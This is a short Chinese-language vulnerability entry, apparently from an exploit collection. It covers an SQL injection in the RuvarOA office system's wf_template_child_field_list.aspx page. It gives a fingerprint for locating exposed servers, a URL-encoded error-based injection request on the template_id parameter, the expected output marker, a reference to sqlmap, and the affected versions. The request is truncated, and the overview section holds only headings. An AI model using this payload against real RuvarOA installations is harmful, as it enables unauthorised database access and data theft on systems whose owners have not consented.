# RuvarOAwf_template_child_field_list存在SQL注入漏洞

- **系统**：RuvarOAwf　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /SysManage/wf_template_child_field_list.aspx?template_id=1+AND+4582+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284582%3D4582%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%`

**请求体 / payload**
```
qkjkq1qpjzq
sqlmap
GET /SysManage/wf_template_child_field_list.aspx?template_id=1 HTTP/1.1
Host:
```

**其他**
- RuvarOA wf\_template\_child\_field\_list存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01